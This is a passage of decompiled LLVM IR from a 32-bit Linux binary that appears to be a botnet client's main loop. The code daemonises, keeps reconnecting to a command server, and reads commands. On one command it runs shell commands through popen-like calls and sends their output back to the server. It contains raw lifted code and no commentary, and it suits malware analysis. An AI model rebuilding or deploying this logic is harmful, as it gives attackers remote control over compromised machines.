  %v1_804d451 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8056c9b.142 to i32))
  br label %dec_label_pc_804d465

dec_label_pc_804d458:                             ; preds = %dec_label_pc_804d3ea
  %v2_804d405 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_804d3ef, i32* %stack_var_-5888, align 4
  %v4_804d412 = call i32 @__libc_waitpid(i32 %v1_804d3ef, i32 %v2_804d405, i32 0)
  store i32 %v4_804d412, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d41e = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8056c9b.142 to i32), i32* %stack_var_-5888, align 4
  %v1_804d460 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8056c9b.142 to i32))
  br label %dec_label_pc_804d465

dec_label_pc_804d465:                             ; preds = %dec_label_pc_804d443.thread, %dec_label_pc_804d449, %dec_label_pc_804d458
  %v0_804d465 = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_8056c8f.139 to i32), i32* %stack_var_-5888, align 4
  %v1_804d471 = call i32 @chdir(i32 ptrtoint (i8** @global_var_8056c8f.139 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_804d485 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_804db42 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d931 = ptrtoint i32* %stack_var_-1648 to i32
  %v4_804d94d = bitcast i32* %stack_var_-1648 to i8*
  %v1_804d7ae = or i32 %v2_804db42, 1
  %storemerge13127 = inttoptr i32 %v1_804d7ae to i8*
  br label %dec_label_pc_804d48c.outer

dec_label_pc_804d48c.outer:                       ; preds = %dec_label_pc_804d76e, %dec_label_pc_804db42, %dec_label_pc_804d465
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_804d465 ], [ %stack_var_-96.2.ph, %dec_label_pc_804db42 ], [ %v4_804d76e, %dec_label_pc_804d76e ]
  %v0_804d48c24 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d49125 = icmp eq i32 %v0_804d48c24, 0
  br i1 %v1_804d49125, label %dec_label_pc_804d4a3, label %dec_label_pc_804d495

dec_label_pc_804d495:                             ; preds = %dec_label_pc_804d48c.outer, %dec_label_pc_804d495
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_804d49c = call i32 @sleep(i32 30)
  %v0_804d48c = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d491 = icmp eq i32 %v0_804d48c, 0
  br i1 %v1_804d491, label %dec_label_pc_804d4a3, label %dec_label_pc_804d495

dec_label_pc_804d4a3:                             ; preds = %dec_label_pc_804d495, %dec_label_pc_804d48c.outer
  %v0_804d4a3 = call i32 @getBuild()
  store i32 %v0_804d4a3, i32* @ebx, align 4
  %v0_804d4aa = load i32, i32* @global_var_8060308.41, align 8
  store i32 %v0_804d4aa, i32* %stack_var_-5888, align 4
  %v1_804d4b2 = call i32 @__GI_inet_ntoa(i32 %v0_804d4aa)
  %v0_804d4b7 = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804d4b7, i32* %stack_var_-5888, align 4
  %v3_804d4d0 = call i32 @Rootsprintf(i32 %v0_804d4b7, i32 ptrtoint (i32* @global_var_8056ca8.143 to i32))
  br label %dec_label_pc_804db42.outer

dec_label_pc_804d4f4:                             ; preds = %dec_label_pc_804d6e5, %dec_label_pc_804d69d
  %v2_804d4f7 = mul i32 %storemerge14, 4
  %v9_804d4f7 = and i32 %storemerge14, 1073741824
  %v10_804d4f7 = icmp ne i32 %v9_804d4f7, 0
  store i1 %v10_804d4f7, i1* %cf.global-to-local, align 1
  %v0_804d4fc = load i32, i32* @global_var_8060314.34, align 4
  %v2_804d501 = add i32 %v0_804d4fc, %v2_804d4f7
  %v1_804d504 = inttoptr i32 %v2_804d501 to i32*
  %v2_804d504 = load i32, i32* %v1_804d504, align 4
  store i32 %v2_804d504, i32* %stack_var_-5888, align 4
  %v4_804d519 = call i32 @__libc_waitpid(i32 %v2_804d504, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_804d519, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_804d69a, label %dec_label_pc_804d526

dec_label_pc_804d526:                             ; preds = %dec_label_pc_804d4f4
  br label %dec_label_pc_804d559

dec_label_pc_804d52f:                             ; preds = %dec_label_pc_804d559, %dec_label_pc_804d593
  %v2_804d532 = mul i32 %storemerge16, 4
  %v0_804d537 = load i32, i32* @global_var_8060314.34, align 4
  %v2_804d53c = add i32 %v0_804d537, %v2_804d532
  %v1_804d53f = add i32 %v2_804d53c, -4
  %v1_804d552 = inttoptr i32 %v2_804d53c to i32*
  %v2_804d552 = load i32, i32* %v1_804d552, align 4
  %v2_804d554 = inttoptr i32 %v1_804d53f to i32*
  store i32 %v2_804d552, i32* %v2_804d554, align 4
  %v4_804d556 = add i32 %storemerge16, 1
  br label %dec_label_pc_804d559

dec_label_pc_804d559:                             ; preds = %dec_label_pc_804d526, %dec_label_pc_804d52f
  %storemerge16 = phi i32 [ %v4_804d556, %dec_label_pc_804d52f ], [ %.pre, %dec_label_pc_804d526 ]
  %v0_804d56d = load i32, i32* @global_var_805a088.32, align 8
  %v0_804d573 = load i32, i32* @global_var_805a08c.33, align 4
  %v10_804d58b = icmp eq i32 %v0_804d573, 0
  br i1 %v10_804d58b, label %dec_label_pc_804d593, label %dec_label_pc_804d52f

dec_label_pc_804d593:                             ; preds = %dec_label_pc_804d559
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d56d, i32* @edi, align 4
  %v10_804d5a7 = icmp ult i32 %storemerge16, %v0_804d56d
  br i1 %v10_804d5a7, label %dec_label_pc_804d52f, label %dec_label_pc_804d5af

dec_label_pc_804d5af:                             ; preds = %dec_label_pc_804d593
  %v2_804d5b2 = mul i32 %storemerge16, 4
  %v0_804d5b7 = load i32, i32* @global_var_8060314.34, align 4
  %v2_804d5bc = add i32 %v2_804d5b2, -4
  %v1_804d5bf = add i32 %v2_804d5bc, %v0_804d5b7
  %v1_804d5c2 = inttoptr i32 %v1_804d5bf to i32*
  store i32 0, i32* %v1_804d5c2, align 4
  %v0_804d5c8 = load i32, i32* @global_var_805a088.32, align 8
  %v0_804d5cd = load i32, i32* @global_var_805a08c.33, align 4
  %v1_804d5d3 = add i32 %v0_804d5c8, -1
  %v4_804d5d3 = icmp ne i32 %v0_804d5c8, 0
  %v2_804d5d6 = zext i1 %v4_804d5d3 to i32
  %v3_804d5d6 = add i32 %v0_804d5cd, -1
  %v4_804d5d6 = add i32 %v3_804d5d6, %v2_804d5d6
  store i32 %v1_804d5d3, i32* @global_var_805a088.32, align 8
  store i32 %v4_804d5d6, i32* @global_var_805a08c.33, align 4
  %v2_804d5f3 = mul i32 %v1_804d5d3, 4
  %v1_804d5f6 = add i32 %v2_804d5f3, 4
  %v5_804d5f6 = icmp eq i32 %v2_804d5f3, -4
  store i1 %v5_804d5f6, i1* %cf.global-to-local, align 1
  store i32 %v1_804d5f6, i32* %stack_var_-5888, align 4
  %v1_804d5fc = call i32 @malloc(i32 %v1_804d5f6)
  br label %dec_label_pc_804d62f

dec_label_pc_804d60d:                             ; preds = %dec_label_pc_804d62f, %dec_label_pc_804d669
  %v2_804d610 = mul i32 %storemerge15, 4
  %v5_804d615 = add i32 %v2_804d610, %v1_804d5fc
  %v0_804d620 = load i32, i32* @global_var_8060314.34, align 4
  %v2_804d625 = add i32 %v0_804d620, %v2_804d610
  %v1_804d628 = inttoptr i32 %v2_804d625 to i32*
  %v2_804d628 = load i32, i32* %v1_804d628, align 4
  %v2_804d62a = inttoptr i32 %v5_804d615 to i32*
  store i32 %v2_804d628, i32* %v2_804d62a, align 4
  %v4_804d62c = add i32 %storemerge15, 1
  br label %dec_label_pc_804d62f

dec_label_pc_804d62f:                             ; preds = %dec_label_pc_804d5af, %dec_label_pc_804d60d
  %storemerge15 = phi i32 [ %v4_804d62c, %dec_label_pc_804d60d ], [ 0, %dec_label_pc_804d5af ]
  %v0_804d643 = load i32, i32* @global_var_805a088.32, align 8
  %v0_804d649 = load i32, i32* @global_var_805a08c.33, align 4
  %v10_804d661 = icmp eq i32 %v0_804d649, 0
  br i1 %v10_804d661, label %dec_label_pc_804d669, label %dec_label_pc_804d60d

dec_label_pc_804d669:                             ; preds = %dec_label_pc_804d62f
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d643, i32* @edi, align 4
  %v10_804d67d = icmp ult i32 %storemerge15, %v0_804d643
  br i1 %v10_804d67d, label %dec_label_pc_804d60d, label %dec_label_pc_804d685

dec_label_pc_804d685:                             ; preds = %dec_label_pc_804d669
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d685 = load i32, i32* @global_var_8060314.34, align 4
  store i32 %v0_804d685, i32* %stack_var_-5888, align 4
  %v1_804d68d = call i32 @free(i32 %v0_804d685)
  store i32 %v1_804d5fc, i32* @global_var_8060314.34, align 4
  br label %dec_label_pc_804d69a

dec_label_pc_804d69a:                             ; preds = %dec_label_pc_804d4f4, %dec_label_pc_804d685
  br label %dec_label_pc_804d69d

dec_label_pc_804d69d:                             ; preds = %dec_label_pc_804db42, %dec_label_pc_804d69a
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_804d69a ], [ 0, %dec_label_pc_804db42 ]
  %v1_804d6a6 = ashr i32 %storemerge14, 31
  %v0_804d6ad = load i32, i32* @global_var_805a088.32, align 8
  store i32 %v0_804d6ad, i32* @esi, align 4
  %v0_804d6b3 = load i32, i32* @global_var_805a08c.33, align 4
  store i32 %v0_804d6b3, i32* @edi, align 4
  %v10_804d6cb = icmp ult i32 %v1_804d6a6, %v0_804d6b3
  store i1 %v10_804d6cb, i1* %cf.global-to-local, align 1
  br i1 %v10_804d6cb, label %dec_label_pc_804d4f4, label %dec_label_pc_804d6d7

dec_label_pc_804d6d7:                             ; preds = %dec_label_pc_804d69d
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d6e3 = icmp ugt i32 %v1_804d6a6, %v0_804d6b3
  br i1 %v6_804d6e3, label %dec_label_pc_804d6f7, label %dec_label_pc_804d6e5

dec_label_pc_804d6e5:                             ; preds = %dec_label_pc_804d6d7
  %v10_804d6eb = icmp ult i32 %storemerge14, %v0_804d6ad
  store i1 %v10_804d6eb, i1* %cf.global-to-local, align 1
  br i1 %v10_804d6eb, label %dec_label_pc_804d4f4, label %dec_label_pc_804d6f7

dec_label_pc_804d6f7:                             ; preds = %dec_label_pc_804d6e5, %dec_label_pc_804d6d7
  %v0_804d6fa = load i32, i32* @ebp, align 4
  %v2_804d6fa = add i32 %v5_804db5d, -5736
  %v3_804d6fa = add i32 %v2_804d6fa, %v0_804d6fa
  %v4_804d6fa = inttoptr i32 %v3_804d6fa to i8*
  store i8 0, i8* %v4_804d6fa, align 1
  store i32 %v2_804db42, i32* %stack_var_-5888, align 4
  %v2_804d70b = call i32 @trim(i8* %tmp121)
  store i32 %v2_804db42, i32* %stack_var_-5888, align 4
  %v4_804d721 = call i32 @strstr(i32 %v2_804db42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056720.19, i32 0, i32 0))
  %v7_804d72e = icmp ult i32 %v4_804d721, %v2_804db42
  store i1 %v7_804d72e, i1* %cf.global-to-local, align 1
  %v12_804d72e = icmp eq i32 %v4_804d721, %v2_804db42
  %v1_804d730 = icmp eq i1 %v12_804d72e, false
  br i1 %v1_804d730, label %dec_label_pc_804d74c, label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d6f7
  %v0_804d732 = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804d732, i32* %stack_var_-5888, align 4
  %v3_804d742 = call i32 @Rootsprintf(i32 %v0_804d732, i32 ptrtoint ([5 x i8]* @global_var_8056d0f.144 to i32))
  br label %dec_label_pc_804db42

dec_label_pc_804d74c:                             ; preds = %dec_label_pc_804d6f7
  store i32 %v2_804db42, i32* %stack_var_-5888, align 4
  %v4_804d75d = call i32 @strstr(i32 %v2_804db42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056d14.145, i32 0, i32 0))
  store i32 %v4_804d75d, i32* @edx, align 4
  %v7_804d76a = icmp ult i32 %v4_804d75d, %v2_804db42
  store i1 %v7_804d76a, i1* %cf.global-to-local, align 1
  %v12_804d76a = icmp eq i32 %v4_804d75d, %v2_804db42
  %v1_804d76c = icmp eq i1 %v12_804d76a, false
  br i1 %v1_804d76c, label %dec_label_pc_804d794, label %dec_label_pc_804d76e

dec_label_pc_804d76e:                             ; preds = %dec_label_pc_804d74c
  %v4_804d76e = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8056d1d.146 to i32), i32* %stack_var_-5888, align 4
  %v1_804d779 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_8056d1d.146 to i32))
  store i32 %v1_804d779, i32* @eax, align 4
  %v9_804d77e = icmp ult i32 %v4_804d76e, 20
  store i1 %v9_804d77e, i1* %cf.global-to-local, align 1
  %v7_804d782 = icmp sgt i32 %v4_804d76e, 20
  br i1 %v7_804d782, label %dec_label_pc_804d788, label %dec_label_pc_804d48c.outer

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d76e
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d78f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d794

dec_label_pc_804d794:                             ; preds = %dec_label_pc_804d74c, %dec_label_pc_804d788
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d74c ], [ %v4_804d76e, %dec_label_pc_804d788 ]
  %v2_804d7a0 = load i8, i8* %tmp121, align 4
  %v6_804d7a3 = icmp ult i8 %v2_804d7a0, 33
  store i1 %v6_804d7a3, i1* %cf.global-to-local, align 1
  %v10_804d7a3 = icmp eq i8 %v2_804d7a0, 33
  %v1_804d7a5 = icmp eq i1 %v10_804d7a3, false
  br i1 %v1_804d7a5, label %dec_label_pc_804db42.outer, label %dec_label_pc_804d7ab

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d794
  %v2_804d7ba128 = load i8, i8* %storemerge13127, align 1
  %v3_804d7bd131 = icmp ult i8 %v2_804d7ba128, 32
  store i1 %v3_804d7bd131, i1* %cf.global-to-local, align 1
  %v7_804d7bd135 = icmp eq i8 %v2_804d7ba128, 32
  br i1 %v7_804d7bd135, label %dec_label_pc_804d7cb, label %dec_label_pc_804d7c1

dec_label_pc_804d7b4:                             ; preds = %dec_label_pc_804d7c1
  %v5_804d7b4 = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_804d7b4 to i8*
  %v2_804d7ba = load i8, i8* %storemerge13, align 1
  %v3_804d7bd = icmp ult i8 %v2_804d7ba, 32
  store i1 %v3_804d7bd, i1* %cf.global-to-local, align 1
  %v7_804d7bd = icmp eq i8 %v2_804d7ba, 32
  br i1 %v7_804d7bd, label %dec_label_pc_804d7cb, label %dec_label_pc_804d7c1

dec_label_pc_804d7c1:                             ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7b4
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_804d7b4 ], [ %storemerge13127, %dec_label_pc_804d7ab ]
  %storemerge13.in137 = phi i32 [ %v5_804d7b4, %dec_label_pc_804d7b4 ], [ %v1_804d7ae, %dec_label_pc_804d7ab ]
  %v2_804d7c4 = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d7c7 = icmp eq i8 %v2_804d7c4, 0
  %v1_804d7c9 = icmp eq i1 %v4_804d7c7, false
  br i1 %v1_804d7c9, label %dec_label_pc_804d7b4, label %dec_label_pc_804d7cb

dec_label_pc_804d7cb:                             ; preds = %dec_label_pc_804d7b4, %dec_label_pc_804d7c1, %dec_label_pc_804d7ab
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_804d7ab ], [ %storemerge13138, %dec_label_pc_804d7c1 ], [ %storemerge13, %dec_label_pc_804d7b4 ]
  %v2_804d7ce = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d7d1 = icmp eq i8 %v2_804d7ce, 0
  br i1 %v4_804d7d1, label %dec_label_pc_804db42.outer, label %dec_label_pc_804d7d9

dec_label_pc_804d7d9:                             ; preds = %dec_label_pc_804d7cb
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_804d7fd = call i32 @_strlen(i8* %storemerge13127)
  %v6_804d804 = add i32 %v2_804db42, %v3_804d7fd
  %v1_804d807 = add i32 %v6_804d804, 2
  %v5_804d807 = icmp ugt i32 %v6_804d804, -3
  store i1 %v5_804d807, i1* %cf.global-to-local, align 1
  %v5_804d80a = inttoptr i32 %v1_804d807 to i8*
  br label %dec_label_pc_804d834

dec_label_pc_804d80f:                             ; preds = %dec_label_pc_804d85d, %dec_label_pc_804d834
  %v3_804d826 = call i32 @_strlen(i8* %v5_804d80a)
  %v4_804d826 = mul i32 %v3_804d826, -1
  %v1_804d82c = sub i32 0, %v4_804d826
  %v6_804d82d = sub i32 %v1_804d807, %v4_804d826
  %v11_804d82d = icmp ult i32 %v6_804d82d, %v1_804d82c
  store i1 %v11_804d82d, i1* %cf.global-to-local, align 1
  %v1_804d830 = add i32 %v6_804d82d, -1
  %v1_804d831 = inttoptr i32 %v1_804d830 to i8*
  store i8 0, i8* %v1_804d831, align 1
  br label %dec_label_pc_804d834

dec_label_pc_804d834:                             ; preds = %dec_label_pc_804d7d9, %dec_label_pc_804d80f
  %v3_804d84b = call i32 @_strlen(i8* %v5_804d80a)
  %v4_804d84b = mul i32 %v3_804d84b, -1
  %v1_804d851 = sub i32 0, %v4_804d84b
  %v6_804d852 = sub i32 %v1_804d807, %v4_804d84b
  %v11_804d852 = icmp ult i32 %v6_804d852, %v1_804d851
  store i1 %v11_804d852, i1* %cf.global-to-local, align 1
  %v1_804d855 = add i32 %v6_804d852, -1
  %v1_804d856 = inttoptr i32 %v1_804d855 to i8*
  %v2_804d856 = load i8, i8* %v1_804d856, align 1
  %v6_804d859 = icmp ult i8 %v2_804d856, 10
  store i1 %v6_804d859, i1* %cf.global-to-local, align 1
  %v10_804d859 = icmp eq i8 %v2_804d856, 10
  br i1 %v10_804d859, label %dec_label_pc_804d80f, label %dec_label_pc_804d85d

dec_label_pc_804d85d:                             ; preds = %dec_label_pc_804d834
  %v3_804d874 = call i32 @_strlen(i8* %v5_804d80a)
  %v4_804d874 = mul i32 %v3_804d874, -1
  %v1_804d87a = sub i32 0, %v4_804d874
  %v6_804d87b = sub i32 %v1_804d807, %v4_804d874
  %v11_804d87b = icmp ult i32 %v6_804d87b, %v1_804d87a
  store i1 %v11_804d87b, i1* %cf.global-to-local, align 1
  %v1_804d87e = add i32 %v6_804d87b, -1
  %v1_804d87f = inttoptr i32 %v1_804d87e to i8*
  %v2_804d87f = load i8, i8* %v1_804d87f, align 1
  %v6_804d882 = icmp ult i8 %v2_804d87f, 13
  store i1 %v6_804d882, i1* %cf.global-to-local, align 1
  %v10_804d882 = icmp eq i8 %v2_804d87f, 13
  br i1 %v10_804d882, label %dec_label_pc_804d80f, label %dec_label_pc_804d886

dec_label_pc_804d886:                             ; preds = %dec_label_pc_804d85d
  %v2_804d894143 = load i8, i8* %v5_804d80a, align 1
  %v3_804d897146 = icmp ult i8 %v2_804d894143, 32
  store i1 %v3_804d897146, i1* %cf.global-to-local, align 1
  %v7_804d897150 = icmp eq i8 %v2_804d894143, 32
  br i1 %v7_804d897150, label %dec_label_pc_804d8a5, label %dec_label_pc_804d89b

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d89b
  %v5_804d88e = add i32 %v4_804d891153, 1
  %v22_804d88e = inttoptr i32 %v5_804d88e to i8*
  %v2_804d894 = load i8, i8* %v22_804d88e, align 1
  %v3_804d897 = icmp ult i8 %v2_804d894, 32
  store i1 %v3_804d897, i1* %cf.global-to-local, align 1
  %v7_804d897 = icmp eq i8 %v2_804d894, 32
  br i1 %v7_804d897, label %dec_label_pc_804d8a5, label %dec_label_pc_804d89b

dec_label_pc_804d89b:                             ; preds = %dec_label_pc_804d886, %dec_label_pc_804d88e
  %v4_804d891153 = phi i32 [ %v5_804d88e, %dec_label_pc_804d88e ], [ %v1_804d807, %dec_label_pc_804d886 ]
  %stack_var_-64.0152 = phi i8* [ %v22_804d88e, %dec_label_pc_804d88e ], [ %v5_804d80a, %dec_label_pc_804d886 ]
  %v2_804d89e = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8a1 = icmp eq i8 %v2_804d89e, 0
  %v1_804d8a3 = icmp eq i1 %v4_804d8a1, false
  br i1 %v1_804d8a3, label %dec_label_pc_804d88e, label %dec_label_pc_804d8a5

dec_label_pc_804d8a5:                             ; preds = %dec_label_pc_804d88e, %dec_label_pc_804d89b, %dec_label_pc_804d886
  %stack_var_-64.0.lcssa = phi i8* [ %v5_804d80a, %dec_label_pc_804d886 ], [ %stack_var_-64.0152, %dec_label_pc_804d89b ], [ %v22_804d88e, %dec_label_pc_804d88e ]
  %v4_804d891.lcssa = phi i32 [ %v1_804d807, %dec_label_pc_804d886 ], [ %v4_804d891153, %dec_label_pc_804d89b ], [ %v5_804d88e, %dec_label_pc_804d88e ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_804d8ab = add i32 %v4_804d891.lcssa, 1
  %v2_804d8d4159 = load i8, i8* %v5_804d80a, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8d7161 = icmp eq i8 %v2_804d8d4159, 0
  %v1_804d8d9163 = icmp eq i1 %v4_804d8d7161, false
  br i1 %v1_804d8d9163, label %dec_label_pc_804d8b6, label %dec_label_pc_804d8db

dec_label_pc_804d8b6:                             ; preds = %dec_label_pc_804d8a5, %dec_label_pc_804d8b6
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_804d8b6 ], [ %v5_804d80a, %dec_label_pc_804d8a5 ]
  %storemerge12.in164 = phi i32 [ %v5_804d8ce, %dec_label_pc_804d8b6 ], [ %v1_804d807, %dec_label_pc_804d8a5 ]
  %v2_804d8b9 = load i8, i8* %storemerge12165, align 1
  %v3_804d8b9 = zext i8 %v2_804d8b9 to i32
  store i32 %v3_804d8b9, i32* %stack_var_-5888, align 4
  %v1_804d8c2 = call i32 @__GI_toupper(i32 %v3_804d8b9)
  %v1_804d8c7 = urem i32 %v1_804d8c2, 256
  %v2_804d8c7 = load i32, i32* @edx, align 4
  %v3_804d8c7 = and i32 %v2_804d8c7, -256
  %v4_804d8c7 = or i32 %v3_804d8c7, %v1_804d8c7
  store i32 %v4_804d8c7, i32* @edx, align 4
  %v1_804d8cc = trunc i32 %v1_804d8c2 to i8
  store i8 %v1_804d8cc, i8* %storemerge12165, align 1
  %v5_804d8ce = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_804d8ce to i8*
  %v2_804d8d4 = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8d7 = icmp eq i8 %v2_804d8d4, 0
  %v1_804d8d9 = icmp eq i1 %v4_804d8d7, false
  br i1 %v1_804d8d9, label %dec_label_pc_804d8b6, label %dec_label_pc_804d8db

dec_label_pc_804d8db:                             ; preds = %dec_label_pc_804d8b6, %dec_label_pc_804d8a5
  store i1 false, i1* @df, align 1
  store i32 %v1_804d807, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8056d31.147 to i32), i32* @edi, align 4
  %v7_804d90b = call i32 @_strncmp(i8* %v5_804d80a, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056d31.147, i32 0, i32 0), i32 11)
  %v8_804d90b = urem i32 %v7_804d90b, 2
  %v9_804d90b = icmp eq i32 %v8_804d90b, 0
  %v0_804d90d = load i1, i1* %cf.global-to-local, align 1
  %v2_804d90d = or i1 %v0_804d90d, %v9_804d90b
  %v3_804d90d = zext i1 %v2_804d90d to i32
  %v4_804d90d = load i32, i32* @edx, align 4
  %v5_804d90d = and i32 %v4_804d90d, -256
  %v6_804d90d = or i32 %v3_804d90d, %v5_804d90d
  %v7_804d90d = xor i32 %v6_804d90d, 1
  store i32 %v7_804d90d, i32* @edx, align 4
  %v3_804d913 = and i32 %v7_804d90b, -256
  %v1_804d915 = trunc i32 %v7_804d90d to i8
  %v3_804d915 = zext i1 %v0_804d90d to i8
  %v4_804d915 = sub nsw i8 %v1_804d915, %v3_804d915
  %v15_804d915 = icmp eq i8 %v4_804d915, 0
  %v20_804d915 = zext i8 %v4_804d915 to i32
  %v23_804d915 = or i32 %v20_804d915, %v3_804d913
  store i32 %v23_804d915, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d91e = icmp eq i1 %v15_804d915, false
  br i1 %v1_804d91e, label %dec_label_pc_804da1f, label %dec_label_pc_804d924

dec_label_pc_804d924:                             ; preds = %dec_label_pc_804d8db
  %v0_804d924 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d929 = icmp eq i32 %v0_804d924, 0
  %v1_804d92b = icmp eq i1 %v1_804d929, false
  br i1 %v1_804d92b, label %dec_label_pc_804db42.outer, label %dec_label_pc_804d931

dec_label_pc_804d931:                             ; preds = %dec_label_pc_804d924
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v5_804d94d = call i32 @__GI_memset(i8* %v4_804d94d, i32 0, i32 1024)
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v4_804d96b = call i32 @szprintf(i32 %v2_804d931, i32 ptrtoint ([8 x i8]* @global_var_8056d3c.148 to i32), i32 %v5_804d8ab)
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v4_804d982 = call i32 @fdpopen(i32 %v2_804d931, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8056c80.137, i32 0, i32 0))
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v4_804d9ff166 = call i32 @fdgets(i32 %v2_804d931, i32 1024, i32 %v4_804d982)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804da04167 = icmp eq i32 %v4_804d9ff166, 0
  %v1_804da06169 = icmp eq i1 %v1_804da04167, false
  br i1 %v1_804da06169, label %dec_label_pc_804d98c, label %dec_label_pc_804da08

dec_label_pc_804d98c:                             ; preds = %dec_label_pc_804d931, %dec_label_pc_804d98c
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v2_804d995 = call i32 @trim(i8* %v4_804d94d)
  %v0_804d99a = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804d99a, i32* %stack_var_-5888, align 4
  %v3_804d9b5 = call i32 @Rootsprintf(i32 %v0_804d99a, i32 ptrtoint ([3 x i8]* @global_var_8056d44.149 to i32))
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v5_804d9d6 = call i32 @__GI_memset(i8* %v4_804d94d, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_804d9e2 = call i32 @sleep(i32 1)
  store i32 %v2_804d931, i32* %stack_var_-5888, align 4
  %v4_804d9ff = call i32 @fdgets(i32 %v2_804d931, i32 1024, i32 %v4_804d982)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804da04 = icmp eq i32 %v4_804d9ff, 0
  %v1_804da06 = icmp eq i1 %v1_804da04, false
  br i1 %v1_804da06, label %dec_label_pc_804d98c, label %dec_label_pc_804da08

dec_label_pc_804da08:                             ; preds = %dec_label_pc_804d98c, %dec_label_pc_804d931
  store i32 %v4_804d982, i32* %stack_var_-5888, align 4
  %v1_804da0e = call i32 @fdpclose(i32 %v4_804d982)
  store i32 %v1_804da0e, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804da1a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804da1f

dec_label_pc_804da1f:                             ; preds = %dec_label_pc_804d8db, %dec_label_pc_804da08
  store i32 %v5_804d8ab, i32* @eax, align 4
  store i32 %v5_804d8ab, i32* %stack_var_-5888, align 4
  %v3_804da34 = call i32 @__GI_strtok(i32 %v5_804d8ab, i32 ptrtoint (i32* @global_var_8056d47.150 to i32))
  %v5_804da39 = inttoptr i32 %v3_804da34 to i8*
  store i8* %v5_804da39, i8** %stack_var_-36, align 4
  store i32 %v1_804d807, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804daf034 = icmp eq i32 %v3_804da34, 0
  %v1_804daf441 = icmp eq i1 %v5_804daf034, false
  br i1 %v1_804daf441, label %dec_label_pc_804da4a, label %dec_label_pc_804dafa

dec_label_pc_804da4a:                             ; preds = %dec_label_pc_804da1f, %dec_label_pc_804dad9
  %v3_804da5b = phi i8* [ %tmp124, %dec_label_pc_804dad9 ], [ %v5_804da39, %dec_label_pc_804da1f ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dad9 ], [ 1, %dec_label_pc_804da1f ]
  %v2_804da4d = load i8, i8* %v3_804da5b, align 1
  %v3_804da4d = zext i8 %v2_804da4d to i32
  store i32 %v3_804da4d, i32* @eax, align 4
  %v6_804da50 = icmp ult i8 %v2_804da4d, 10
  store i1 %v6_804da50, i1* %cf.global-to-local, align 1
  %v10_804da50 = icmp eq i8 %v2_804da4d, 10
